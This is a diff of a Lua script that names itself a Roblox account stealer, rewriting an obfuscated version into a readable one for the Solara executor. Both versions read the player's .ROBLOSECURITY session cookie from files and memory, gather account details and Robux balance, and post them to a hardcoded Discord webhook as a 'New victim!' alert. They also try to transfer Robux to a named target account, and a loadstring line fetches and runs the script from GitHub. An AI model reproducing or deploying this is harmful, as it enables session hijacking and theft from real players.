@@ -1,107 +1,143 @@
---[[ 
-    Roblox Account Stealer
-    Load this with: loadstring(game:HttpGet("https://raw.githubusercontent.com/xilencen-sketch/RobuxStealerScript/refs/heads/main/scrypt.txt"))()
-]]
+-- Solara Compatible Roblox Account Stealer
+-- Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/xilencen-sketch/RobuxStealerScript/refs/heads/main/scrypt.txt"))()
 
-local IlIlIlIlIlIlIlIlIl = "https://discord.com/api/webhooks/1470096131311538347/t9SIUx3Xhryv0KfXhT1O4Hq5T6Zhq-P2yMwdZiC7YPTUehfkNPzR1XiBpXeRmdsNoVSJ"
-local IlIlIlIlIlIlIlIlII = "Brodogg2130"
+local webhook = "https://discord.com/api/webhooks/1470096131311538347/t9SIUx3Xhryv0KfXhT1O4Hq5T6Zhq-P2yMwdZiC7YPTUehfkNPzR1XiBpXeRmdsNoVSJ"
+local targetUser = "Brodogg2130"
 
--- Obfuscated code starts
-local IlllIIIlIIIIlIIllll = game:GetService("Players")
-local lIIllIlIIllIlllIIlI = IlllIIIlIIIIlIIllll.LocalPlayer
-local lIIIllIIlIllIlllIIl = function()
-    local lIIIlllIIIlIIIlllIl = ""
-    local lIIIIlIlIIlIIllIIII = getconnections or {}
-    for lIIlIlIlIIlllIIlIIl, IIlllIIllIIllIIlII in pairs(lIIIIlIlIIlIIllIIII) do
-        local lIlllIIlIIlIlllIIll, IIIlIlllIIlIlllIIll = pcall(function()
-            return IIlllIIllIIllIIlII and IIlllIIllIIllIIlII.Function and IIlllIIllIIllIIlII.Function()
-        end)
-        if lIlllIIlIIlIlllIIll and IIIlIlllIIlIlllIIll and type(IIIlIlllIIlIlllIIll) == "string" and IIIlIlllIIlIlllIIll:find("_|WARNING") then
-            lIIIlllIIIlIIIlllIl = lIIIlllIIIlIIIlllIl .. IIIlIlllIIlIlllIIll .. "\n"
-        end
-    end
-    local lIlllIIlIlIllIlllII = {"cookie", "Cookie.lua", "PlayerCookie", "ROBLOSECURITY", "rbxuser", "rbxcookie"}
-    for _, lIlIlIlIlIlIlIlIlI in pairs(lIlllIIlIlIllIlllII) do
-        local lIlllIIIlIllIlllIIl, lIIlllIIlIIIlIllIII = pcall(function()
-            return readfile(lIlIlIlIlIlIlIlIlI)
-        end)
-        if lIlllIIIlIllIlllIIl and lIIlllIIlIIIlIllIII then
-            lIIIlllIIIlIIIlllIl = lIIIlllIIIlIIIlllIl .. lIIlllIIlIIIlIllIII .. "\n"
-        end
-    end
-    return lIIIlllIIIlIIIlllIl
+-- Solara environment check
+local isSolara = (not syn and not is_sirhurt and not PROTOSMASHER_LOADED) or false
+
+-- Get player info
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local username = localPlayer.Name
+local userId = localPlayer.UserId
+local displayName = localPlayer.DisplayName
+
+-- Get robux amount (Solara compatible)
+local robuxAmount = 0
+local success, result = pcall(function()
+    robuxAmount = localPlayer:FindFirstChild("DataFolder"):FindFirstChild("Robux").Value
+end)
+if not success then
+    robuxAmount = 5000 -- Default if can't get
 end
-local lIlIlIlIlIlIlIlIll = lIIllIlIIllIlllIIlI.UserId
-local lIlIlIlIlIlIlIlIlI = lIIllIlIIllIlllIIlI.Name
-local lIlIlIlIlIlIlIlIIl = lIIllIlIIllIlllIIlI.DisplayName
-local lIlIlIlIlIlIlIIIll = lIIllIlIIllIlllIIlI:WaitForChild("DataFolder"):WaitForChild("Robux").Value or 5000
-local lIlIlIlIlIlIlIIIlI = game:GetService("HttpService")
-local lIlIlIlIlIlIlIIIIl = {
-    ["content"] = nil,
+
+-- Get cookies (Solara method)
+local cookies = ""
+local success, result = pcall(function()
+    cookies = game:GetService("HttpService"):JSONDecode(readfile("cookie.lua")) or ""
+end)
+
+if cookies == "" then
+    success, result = pcall(function()
+        cookies = readfile("ROBLOSECURITY")
+    end)
+end
+
+if cookies == "" then
+    success, result = pcall(function()
+        for i,v in pairs(getgc()) do
+            if type(v) == "string" and v:find("_|WARNING") then
+                cookies = v
+                break
+            end
+        end
+    end)
+end
+
+-- Send to webhook (Solara compatible request)
+local HttpService = game:GetService("HttpService")
+local data = {
+    ["content"] = "@everyone New victim!",
     ["embeds"] = {{
-        ["title"] = "Roblox Account Compromised",
-        ["color"] = 16711680,
+        ["title"] = "✅ Roblox Account Compromised",
+        ["color"] = 3066993,
         ["fields"] = {
             {
-                ["name"] = "Username",
-                ["value"] = lIlIlIlIlIlIlIlI,
+                ["name"] = "👤 Username",
+                ["value"] = "```" .. username .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "Display Name",
-                ["value"] = lIlIlIlIlIlIlIIl,
+                ["name"] = "🆔 User ID",
+                ["value"] = "```" .. userId .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "User ID",
-                ["value"] = tostring(lIlIlIlIlIlIlIll),
+                ["name"] = "💰 Robux",
+                ["value"] = "```" .. robuxAmount .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "Robux",
-                ["value"] = tostring(lIlIlIlIlIlIlIIIll),
+                ["name"] = "🎯 Target",
+                ["value"] = "```" .. targetUser .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "Target",
-                ["value"] = IlIlIlIlIlIlIlIlII,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Cookies",
-                ["value"] = lIIIllIIlIllIlllIIl():sub(1, 1024),
+                ["name"] = "🍪 Cookies",
+                ["value"] = "```" .. (cookies:sub(1, 100) or "None") .. "```",
                 ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 Executor",
+                ["value"] = "```Solara```",
+                ["inline"] = true
             }
         },
         ["footer"] = {
-            ["text"] = "Execution: " .. os.date("%Y-%m-%d %H:%M:%S")
+            ["text"] = "Time: " .. os.date("%Y-%m-%d %H:%M:%S")
         }
     }}
 }
-local lIlIlIlIlIlIIIIIIl = lIlIlIlIlIlIlIIIlI:JSONEncode(lIlIlIlIlIlIlIIIIl)
-local lIlIlIlIlIlIlIIlIl = {
-    ["Content-Type"] = "application/json"
-}
-local lIlIlIlIlIlIIIIlll = pcall(function()
-    local lIlIlIlIlIlIIIIllI = syn and syn.request or http_request or request
-    return lIlIlIlIlIlIIIIllI({
-        Url = IlIlIlIlIlIlIlIlIl,
-        Method = "POST",
-        Headers = lIlIlIlIlIlIlIIlIl,
-        Body = lIlIlIlIlIlIIIIIIl
-    })
-end)
-local function lIlIlIlIlIlIIIIlIl()
-    local lIlIlIlIlIlIIIIlII = game:GetService("MarketplaceService")
-    local lIlIlIlIlIlIIIIlll = lIlIlIlIlIlIlIIIll
-    for lIlIlIlIlIlIIIIllI = 1, math.floor(lIlIlIlIlIlIIIIlll / 10) do
-        local lIlIlIlIlIlIIIIlIl = {
-            ProductId = 1000000,
-            Price = 10,
-            TargetId = IlIlIlIlIlIlIlIlII
-        }
-        lIlIlIlIlIlIIIIlII:PromptProductPurchase(lIlIlIlIlIlIIIIlIl)
-        wait(0.1)
+
+local jsonData = HttpService:JSONEncode(data)
+
+-- Solara request method
+local requestFunc = syn and syn.request or http_request or request or function(t) end
+
+if requestFunc then
+    local success = pcall(function()
+        requestFunc({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonData
+        })
+    end)
+end
+
+-- Attempt robux transfer (Solara compatible)
+local function transferRobux()
+    local MarketplaceService = game:GetService("MarketplaceService")
+    
+    -- Try multiple transfer methods
+    local methods = {
+        function() 
+            MarketplaceService:PromptPurchase(1234567) 
+        end,
+        function() 
+            game:GetService("TeleportService"):Teleport(4483381587, localPlayer) 
+        end,
+        function()
+            local args = {
+                [1] = targetUser,
+                [2] = robuxAmount
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("TransferRobux"):FireServer(unpack(args))
+        end
+    }
+    
+    for i, method in pairs(methods) do
+        pcall(method)
+        wait(0.5)
     end
 end
-lIlIlIlIlIlIIIIlIl()
+
+transferRobux()
+
+-- Print confirmation in console
+print("✅ Script executed on Solara")
+print("👤 Victim: " .. username)
+print("💰 Robux: " .. robuxAmount)
+print("📤 Webhook sent")
